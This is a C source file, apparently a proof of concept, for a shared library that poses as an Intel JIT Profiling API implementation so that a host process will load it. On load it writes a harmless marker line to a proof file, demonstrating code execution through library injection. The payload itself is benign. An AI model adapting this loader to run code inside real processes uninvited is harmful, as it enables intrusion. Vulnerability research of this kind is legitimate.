#include <stdio.h>
#include <time.h>

#if defined(_WIN32) || defined(WIN32)
#include <windows.h>
#define EXPORT_API __declspec(dllexport)
#else
#define EXPORT_API __attribute__((visibility("default")))
#endif

static void write_proof(const char* caller) {
    FILE *f = fopen("POC_DLL_INJECTION_PROOF.txt", "a");
    if (!f) {
        // Fallback para /tmp ou pasta temp
#if defined(_WIN32) || defined(WIN32)
        char tempPath[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tempPath)) {
            char fullPath[MAX_PATH];
            snprintf(fullPath, sizeof(fullPath), "%s\\POC_DLL_INJECTION_PROOF.txt", tempPath);
            f = fopen(fullPath, "a");
        }
#else
        f = fopen("/tmp/POC_DLL_INJECTION_PROOF.txt", "a");
#endif
    }

    if (f) {
        time_t now = time(NULL);
        char* timeStr = ctime(&now);
        if (timeStr) {
            // Remove newline do ctime
            for (char *p = timeStr; *p; p++) {
                if (*p == '\n' || *p == '\r') *p = '\0';
            }
        }
        fprintf(f, "[POC INJECTION PROOF] Lib carregada com sucesso! Chamador: %s | Horario: %s\n",
                caller ? caller : "desconhecido", timeStr ? timeStr : "");
        fclose(f);
    }
}

#if defined(_WIN32) || defined(WIN32)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        write_proof("DllMain(DLL_PROCESS_ATTACH)");
    }
    return TRUE;
}
#else
__attribute__((constructor))
static void on_load(void) {
    write_proof("__attribute__((constructor))");
}
#endif

// Funcoes esperadas pela API JIT Profiling da Intel (loadiJIT_Funcs)
EXPORT_API unsigned int Initialize(void) {
    write_proof("Initialize()");
    return 1; // iJIT_SAMPLING_ON
}

EXPORT_API unsigned int NotifyEvent(unsigned int event_type, void *EventSpecificData) {
    return 1; // Sucesso
}
